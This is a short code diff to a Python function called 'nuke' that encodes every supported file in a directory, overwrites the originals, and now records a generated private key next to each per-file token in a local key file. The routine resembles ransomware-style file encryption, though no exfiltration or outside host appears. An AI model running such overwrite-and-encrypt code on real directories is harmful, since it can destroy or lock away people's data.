@@ -23,6 +23,7 @@ def nuke(path, algo):
     #print("\nsupported files : ", list_of_files)
     for file in list_of_files:
         token = algo.generate_token()
+        priv_key = algo.generate_private_key(token)
         the_file = path +file
         content = ""
         try:
@@ -36,7 +37,7 @@ def nuke(path, algo):
         overwrite_file(the_file, encoded)
         print("Succesfully nuke file : " + file , "with token / key : ", token)
         nuked += 1
-        tokens.update({file : str(token)})
+        tokens.update({file : [str(token), str(priv_key)]})
     token_file = storeTokenIntoFile(str(tokens), "nuked-dir", True)
     print("succesfully nuked {} files from total {} files".format(nuked, len(list_of_files)))
     print("keys is stored in file : ", token_file)
